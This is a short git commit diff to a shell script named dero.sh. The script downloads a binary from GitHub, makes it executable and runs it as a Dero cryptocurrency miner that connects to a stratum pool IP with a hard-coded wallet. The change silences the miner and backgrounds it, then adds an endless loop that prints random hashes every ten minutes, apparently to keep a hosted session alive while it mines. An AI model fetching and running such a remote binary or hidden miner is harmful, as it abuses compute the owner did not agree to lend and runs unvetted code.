e191829da5d7ccf7249e25e13e50a3807c44befb
aqshakuy <109946853+aqshakuy@users.noreply.github.com>
2022-11-07 23:35:59 +0700

    Update dero.sh

--- dero.sh
+++ dero.sh
@@ -1,3 +1,4 @@
 wget https://github.com/aqshakuy/dora/raw/main/dero
 chmod 777 dero
-./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9 -r 170.187.197.220:443 -p stratum -m 3
+./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9 -r 170.187.197.220:443 -p stratum -m 3 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
